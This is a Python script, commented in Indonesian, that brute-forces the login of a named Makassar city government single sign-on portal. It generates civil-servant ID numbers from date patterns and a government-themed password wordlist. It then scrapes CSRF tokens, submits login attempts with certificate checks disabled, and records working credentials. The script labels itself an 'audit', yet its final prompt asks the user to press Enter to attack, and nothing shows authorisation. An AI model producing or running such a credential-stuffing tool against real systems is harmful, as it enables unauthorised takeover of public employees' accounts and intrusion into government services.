import requests
import sys
import time
import urllib3
import re
import os
import datetime
from termcolor import colored, cprint
import pyfiglet

# Disable SSL Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# BAGIAN 1: UTILITIES & UI
# ==========================================
def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = pyfiglet.figlet_format("MAKASSAR SOC", font="small")
    cprint(banner, 'cyan', attrs=['bold'])
    print(colored("[+] Target: sso.bkpsdmd.makassarkota.go.id", "yellow"))
    print(colored("[+] Auditor: INDRAYAZA Z (Certified SOC Analyst)", "yellow"))
    print(colored("[+] Fitur : Auto-Generate NIP & ASN Wordlist", "green"))
    print("-" * 60)

# ==========================================
# BAGIAN 2: MODULE GENERATOR
# ==========================================
def generate_nip_module():
    print(colored("\n[ MODULE: NIP GENERATOR ]", "cyan"))
    print("Format NIP: TglLahir(8) + TglAngkat(6) + JK(1) + Urut(3)")
    
    try:
        thn_lhr_start = int(input(">> Mulai Tahun Lahir (cth: 1980): "))
        thn_lhr_end = int(input(">> Sampai Tahun Lahir (cth: 1982): "))
        # Default sampling untuk demo agar tidak terlalu lama
        print(colored("[*] Menggunakan sampel tanggal lahir & angkat acak untuk efisiensi...", "yellow"))
    except:
        return []

    generated_nips = []
    
    # Logika Generasi (Sampel Efisien)
    for thn in range(thn_lhr_start, thn_lhr_end + 1):
        # Sampel: Tgl 01-02, Bulan 01-02
        for bln in range(1, 3): 
            for tgl in range(1, 3):
                str_tgl_lhr = f"{thn}{bln:02d}{tgl:02d}"
                
                # Asumsi Angkat 20-25 tahun setelah lahir
                thn_angkat = thn + 23 
                str_tgl_ang = f"{thn_angkat}01" # Angkat bulan Januari
                
                # JK 1 (Pria) dan 2 (Wanita)
                for jk in range(1, 3):
                    # Urut 001 - 003
                    for urut in range(1, 4):
                        nip = f"{str_tgl_lhr}{str_tgl_ang}{jk}{urut:03d}"
                        generated_nips.append(nip)
    
    # Simpan ke file
    filename = f"nip_gen_{thn_lhr_start}_{thn_lhr_end}.txt"
    with open(filename, "w") as f:
        for n in generated_nips: f.write(n + "\n")
    
    print(colored(f"[SUCCESS] Berhasil generate {len(generated_nips)} NIP.", "green"))
    print(colored(f"[INFO] Disimpan sementara di {filename}", "white"))
    return generated_nips

def generate_pass_module():
    print(colored("\n[ MODULE: ASN MAKASSAR WORDLIST GENERATOR ]", "cyan"))
    
    base_words = [
        "makassar", "bkpsdmd", "pemkot", "admin", "asn", "pns", 
        "lontara", "ewako", "rahasia", "user"
    ]
    years = ["2023", "2024", "2025", "123", "123456"]
    
    generated_pass = set()
    
    print(colored("[*] Meracik password berdasarkan profil ASN...", "yellow"))
    
    for base in base_words:
        cases = [base.lower(), base.capitalize(), base.upper()]
        for word in cases:
            for y in years:
                generated_pass.add(f"{word}{y}")
                generated_pass.add(f"{word}@{y}")
    
    # Top Global Passwords
    generated_pass.update(["123456", "12345678", "password", "qwerty"])
    
    final_list = sorted(list(generated_pass))
    
    filename = "pass_asn_auto.txt"
    with open(filename, "w") as f:
        for p in final_list: f.write(p + "\n")
        
    print(colored(f"[SUCCESS] Berhasil generate {len(final_list)} password profil ASN.", "green"))
    return final_list

# ==========================================
# BAGIAN 3: AUDIT ENGINE
# ==========================================
def get_csrf_token(session, url):
    try:
        r = session.get(url, verify=False, timeout=10)
        token = re.search(r'name="_token" value="([^"]+)"', r.text)
        if not token:
            token = re.search(r'name="csrf-token" content="([^"]+)"', r.text)
        return token.group(1) if token else None
    except:
        return None

def run_audit_engine(nips, passwords):
    login_url = "https://sso.bkpsdmd.makassarkota.go.id/v1/login"
    auth_url = "https://sso.bkpsdmd.makassarkota.go.id/v1/authenticate"
    
    print(colored(f"\n[*] MEMULAI AUDIT: {len(nips)} NIP x {len(passwords)} Password", "cyan", attrs=['bold']))
    print(colored("="*60, "white"))
    
    found_count = 0
    
    for nip in nips:
        # print(colored(f"[*] Testing NIP: {nip}", "yellow")) # Uncomment jika ingin log verbose
        
        for password in passwords:
            session = requests.Session()
            session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            
            token = get_csrf_token(session, login_url)
            if not token: continue
            
            payload = {
                'nip': nip,
                'password': password,
                'remember': 'false',
                '_token': token
            }
            
            try:
                r = session.post(auth_url, data=payload, verify=False, allow_redirects=True)
                
                # Logika Sukses: URL berubah dari halaman login
                if r.url != login_url and r.status_code == 200:
                    print(colored(f"\n[CRITICAL] LOGIN SUCCESS!", "green", attrs=['bold']))
                    print(colored(f" > NIP  : {nip}", "green"))
                    print(colored(f" > PASS : {password}", "green"))
                    print(colored(f" > URL  : {r.url}", "white"))
                    
                    with open("audit_success.txt", "a") as f:
                        f.write(f"NIP: {nip} | PASS: {password} | URL: {r.url}\n")
                    
                    found_count += 1
                    break # Pindah ke NIP selanjutnya jika sudah ketemu passwordnya
                
                else:
                    sys.stdout.write(f"\r[Testing] NIP: {nip} | Pass: {password} -> Fail")
                    sys.stdout.flush()
                    
            except KeyboardInterrupt:
                print("\n[!] Stopped by User."); sys.exit()
            except:
                pass
    
    print(colored(f"\n\n[DONE] Audit Selesai. Ditemukan: {found_count} kredensial valid.", "cyan"))

# ==========================================
# MAIN CONTROLLER (MENU LOGIC)
# ==========================================
def main():
    print_banner()
    
    # --- STEP 1: PILIH TARGET (NIP) ---
    print(colored("[ STEP 1 ] TARGET SELECTION (NIP)", 'white', attrs=['bold']))
    print("1. Input NIP Manual (Single Target)")
    print("2. Load File NIP (Existing List)")
    print("3. Generate NIP (Reconnaissance Mode)")
    
    choice_nip = input(colored(">> Pilihan (1-3): ", 'yellow'))
    
    target_nips = []
    
    if choice_nip == '1':
        nip = input(">> Masukkan NIP: ").strip()
        target_nips.append(nip)
    elif choice_nip == '2':
        path = input(">> Path File NIP: ").strip()
        try:
            with open(path, 'r') as f: target_nips = f.read().splitlines()
            print(colored(f"[+] Loaded {len(target_nips)} NIPs.", "green"))
        except: print("[!] File tidak ditemukan."); sys.exit()
    elif choice_nip == '3':
        target_nips = generate_nip_module()
        if not target_nips: sys.exit()
    else:
        print("[!] Pilihan salah."); sys.exit()

    # --- STEP 2: PILIH PASSWORD ---
    print(colored("\n[ STEP 2 ] PASSWORD SELECTION", 'white', attrs=['bold']))
    print("1. Load File Password (Existing Wordlist)")
    print("2. Generate Password (ASN Makassar Profile)")
    
    choice_pass = input(colored(">> Pilihan (1-2): ", 'yellow'))
    
    target_pass = []
    
    if choice_pass == '1':
        path = input(">> Path File Password: ").strip()
        try:
            with open(path, 'r') as f: target_pass = f.read().splitlines()
            print(colored(f"[+] Loaded {len(target_pass)} Passwords.", "green"))
        except: print("[!] File tidak ditemukan."); sys.exit()
    elif choice_pass == '2':
        target_pass = generate_pass_module()
    else:
        print("[!] Pilihan salah."); sys.exit()

    # --- STEP 3: EXECUTE ---
    input(colored(f"\n[READY] Tekan Enter untuk menyerang {len(target_nips)} NIP dengan {len(target_pass)} Password...", "cyan"))
    run_audit_engine(target_nips, target_pass)

if __name__ == "__main__":
    main()
